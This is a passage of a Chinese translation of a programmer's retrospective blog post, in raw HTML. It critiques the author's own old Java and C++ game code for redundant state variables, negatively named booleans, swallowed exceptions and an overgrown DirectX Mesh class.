id=\"crayon-594bab39c14de132195812-12\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14de132195812-13\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0030 seconds] -->\r\n<p>我要指出两个有趣的问题。 首先，这里涉及了多个状态变量：</p>\n<ul>\n<li>changeTime</li>\n<li>changing</li>\n<li>weaponGroup</li>\n<li>weaponGroup.xform.velocityAngleX</li>\n</ul>\n<p>即使定义了这么多的变量，仍感觉像是缺少点什么似的。噢，对了，我们还需要一个变量来跟踪<strong>当前装备的武器</strong>。 当然，这个变量被定义在另一个文件中。</p>\n<p>另一个有趣的问题是，我从来没有真正创建过一个以上的武器模型。每个武器使用相同的模型。所有的武器模型代码只是累赘<span style=\"color: #000000;\">。</span></p>\n<h3>如何改进</h3>\n<p>删除多余的变量。在这个案例中，只需要设置两个变量：weaponSwitchTimer 和 weaponCurrent。其他一切状态，都可以从这两个变量中推演得到。</p>\n<p>显示地初始化一切。 此函数将检查武器是否为空，并在必要时对其进行初始化。三十秒的观察期，能够确保玩家在本游戏中始终拥有武器。如果没有武器，则游戏无法进行，也可能程序会崩溃。</p>\n<p>显然，在某些时候，我在这个函数中遇到了一个空指针异常（NullPointerException）。然而，我并没有思考为什么会出现空指针异常，相反地，我只是在函数中插入了一个快速的非空检查，并让程序继续运行。事实上，大多数武器处理函数都进行了这样的非空检查！</p>\n<p>提前检查，提前处理！ 不要将这些问题留给电脑去解决。</p>\n<h3>命名</h3>\n<p></p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c14e9594743995\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nboolean noenemies = true; // why oh why</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c14e9594743995-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c14e9594743995-1\"><span class=\"crayon-t\">boolean</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">noenemies</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-t\">true</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// why oh why</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>对布尔变量进行正向命名。如果你发现自己写的代码也像这样，那你可能得重新评估一下你的一些「人生决策」了：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c14ed436183501\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif (!noenemies) {\r\n    // are there enemies or not??\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c14ed436183501-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14ed436183501-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14ed436183501-3\">3</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c14ed436183501-1\"><span class=\"crayon-st\">if</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-o\">!</span><span class=\"crayon-v\">noenemies</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14ed436183501-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-c\">// are there enemies or not??</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14ed436183501-3\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3>错误处理</h3>\n<p>整个代码库中，随意散落着像这样的代码片段：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c14f0165964946\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nstatic {\r\n    try {\r\n        gun = Resources.parseModel(\"images/gun.txt\");\r\n    } catch (FileNotFoundException e) {} // *shrug*\r\n    catch (IOException e) {}\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f0165964946-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f0165964946-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f0165964946-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f0165964946-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f0165964946-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f0165964946-6\">6</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c14f0165964946-1\"><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f0165964946-2\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">try</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f0165964946-3\"><span class=\"crayon-h\">        </span><span class=\"crayon-v\">gun</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">=</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Resources</span><span class=\"crayon-sy\">.</span><span class=\"crayon-e\">parseModel</span><span class=\"crayon-sy\">(</span><span class=\"crayon-s\">\"images/gun.txt\"</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f0165964946-4\"><span class=\"crayon-h\">    </span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">FileNotFoundException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// *shrug*</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f0165964946-5\"><span class=\"crayon-h\">    </span><span class=\"crayon-st\">catch</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">(</span><span class=\"crayon-i\">IOException</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">e</span><span class=\"crayon-sy\">)</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span><span class=\"crayon-sy\">}</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f0165964946-6\"><span class=\"crayon-sy\">}</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0011 seconds] -->\r\n<p>你可能会认为「应该更优雅地处理这个错误！向用户或某事件发送消息。」事实上，我认为刚好相反。</p>\n<p>做再多的错误<strong>检查</strong>都不为过，但一定不要做过多的错误<strong>处理</strong>。在这个例子中，没有武器模型，游戏是无法进行的，所以我宁愿让程序崩溃。不要试图对不可恢复的错误进行温和处理。</p>\n<p>这就要求我们提前判定哪些错误是可以恢复的。不幸的是，Sun 认为几乎所有 Java 错误都<strong>必须</strong>是可恢复的，这导致类似于上述例子中的懒惰错误处理。</p>\n<h2>2005-2006年</h2>\n<p>在这个时间段，我学习了 C++ 和 DirectX。 我决定写一个可复用的引擎，以便人们可以从我过去 14 年来学到的丰富知识和经验中获益。</p>\n<p>如果你认为这次也将只是令人尴尬或难为情的，请先保留你的观点。</p>\n<p><iframe width=\"600\" height=\"450\" src=\"http://v.qq.com/iframe/player.html?vid=i05115ol5rs\" frameborder=\"0\" allowfullscreen=\"allowfullscreen\"></iframe></p>\n<p>当时，我已经学习了面向对象编程，它被认为是写好代码的标志。这导致我写出以下这种怪物代码：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-594bab39c14f4594784944\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div><span class=\"crayon-language\">C++</span></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nclass Mesh {\r\npublic:\r\n\tstatic std::list&lt;Mesh*&gt; meshes; // Static list of meshes; used for caching and rendering\r\n\tMesh(LPCSTR file); // Loads the x file specified\r\n\tMesh();\r\n\tMesh(const Mesh&amp; vMesh);\r\n\t~Mesh();\r\n\tvoid LoadMesh(LPCSTR xfile); // Loads the x file specified\r\n\tvoid DrawSubset(DWORD index); // Draws the specified subset of the mesh\r\n\tDWORD GetNumFaces(); // Returns the number of faces (triangles) in the mesh\r\n\tDWORD GetNumVertices(); // Returns the number of vertices (points) in the mesh\r\n\tDWORD GetFVF(); // Returns the Flexible Vertex Format of the mesh\r\n\tint GetNumSubsets(); // Returns the number of subsets (materials) in the mesh\r\n\tTransform transform; // World transform\r\n\tstd::vector* GetMaterials(); // Gets the list of materials in this mesh\r\n\tstd::vector&lt;Cell*&gt;* GetCells(); // Gets the list of cells this mesh is inside\r\n\tD3DXVECTOR3 GetCenter(); // Gets the center of the mesh\r\n\tfloat GetRadius(); // Gets the distance from the center to the outermost vertex of the mesh\r\n\tbool IsAlpha(); // Returns true if this mesh has alpha information\r\n\tbool IsTranslucent(); // Returns true if this mesh needs access to the back buffer\r\n\tvoid AddCell(Cell* cell); // Adds a cell to the list of cells this mesh is inside\r\n\tvoid ClearCells(); // Clears the list of cells this mesh is inside\r\nprotected:\r\n\tID3DXMesh* d3dmesh; // Actual mesh data\r\n\tLPCSTR filename; // Mesh file name; used for caching\r\n\tDWORD numSubsets; // Number of subsets (materials) in the mesh\r\n\tstd::vector materials; // List of materials; loaded from X file\r\n\tstd::vector&lt;Cell*&gt; cells; // List of cells this mesh is inside\r\n\tD3DXVECTOR3 center; // The center of the mesh\r\n\tfloat radius; // The distance from the center to the outermost vertex of the mesh\r\n\tbool alpha; // True if this mesh has alpha information\r\n\tbool translucent; // True if this mesh needs access to the back buffer\r\n\tvoid SetTo(Mesh* mesh);\r\n}</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-7\">7</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-8\">8</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-9\">9</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-10\">10</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-11\">11</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-12\">12</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-13\">13</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-14\">14</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-15\">15</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-16\">16</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-17\">17</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-18\">18</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-19\">19</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-20\">20</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-21\">21</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-22\">22</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-23\">23</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-24\">24</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-25\">25</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-26\">26</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-27\">27</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-28\">28</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-29\">29</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-30\">30</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-31\">31</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-32\">32</div><div class=\"crayon-num\" data-line=\"crayon-594bab39c14f4594784944-33\">33</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-594bab39c14f4594784944-34\">34</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-1\"><span class=\"crayon-t\">class</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">Mesh</span><span class=\"crayon-h\"> </span><span class=\"crayon-sy\">{</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-2\"><span class=\"crayon-m\">public</span><span class=\"crayon-o\">:</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-3\"><span class=\"crayon-h\">\t</span><span class=\"crayon-m\">static</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">std</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">list</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Mesh</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">meshes</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Static list of meshes; used for caching and rendering</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-4\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">Mesh</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPCSTR </span><span class=\"crayon-v\">file</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Loads the x file specified</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-5\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">Mesh</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-6\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">Mesh</span><span class=\"crayon-sy\">(</span><span class=\"crayon-m\">const</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">Mesh</span><span class=\"crayon-o\">&amp;</span><span class=\"crayon-h\"> </span><span class=\"crayon-v\">vMesh</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-7\"><span class=\"crayon-h\">\t</span><span class=\"crayon-o\">~</span><span class=\"crayon-e\">Mesh</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-8\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">LoadMesh</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">LPCSTR </span><span class=\"crayon-v\">xfile</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Loads the x file specified</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-9\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">void</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">DrawSubset</span><span class=\"crayon-sy\">(</span><span class=\"crayon-e\">DWORD </span><span class=\"crayon-v\">index</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Draws the specified subset of the mesh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-10\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">DWORD </span><span class=\"crayon-e\">GetNumFaces</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Returns the number of faces (triangles) in the mesh</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-11\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">DWORD </span><span class=\"crayon-e\">GetNumVertices</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Returns the number of vertices (points) in the mesh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-12\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">DWORD </span><span class=\"crayon-e\">GetFVF</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Returns the Flexible Vertex Format of the mesh</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-13\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">int</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GetNumSubsets</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Returns the number of subsets (materials) in the mesh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-14\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">Transform </span><span class=\"crayon-v\">transform</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// World transform</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-15\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">std</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GetMaterials</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Gets the list of materials in this mesh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-16\"><span class=\"crayon-h\">\t</span><span class=\"crayon-v\">std</span><span class=\"crayon-o\">::</span><span class=\"crayon-v\">vector</span><span class=\"crayon-o\">&lt;</span><span class=\"crayon-v\">Cell</span><span class=\"crayon-o\">*</span><span class=\"crayon-o\">&gt;</span><span class=\"crayon-o\">*</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GetCells</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Gets the list of cells this mesh is inside</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-17\"><span class=\"crayon-h\">\t</span><span class=\"crayon-e\">D3DXVECTOR3 </span><span class=\"crayon-e\">GetCenter</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Gets the center of the mesh</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-18\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">float</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">GetRadius</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Gets the distance from the center to the outermost vertex of the mesh</span></div><div class=\"crayon-line\" id=\"crayon-594bab39c14f4594784944-19\"><span class=\"crayon-h\">\t</span><span class=\"crayon-t\">bool</span><span class=\"crayon-h\"> </span><span class=\"crayon-e\">IsAlpha</span><span class=\"crayon-sy\">(</span><span class=\"crayon-sy\">)</span><span class=\"crayon-sy\">;</span><span class=\"crayon-h\"> </span><span class=\"crayon-c\">// Returns true if this mesh has alpha information</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-594bab39c14f4594784944-20\"><span 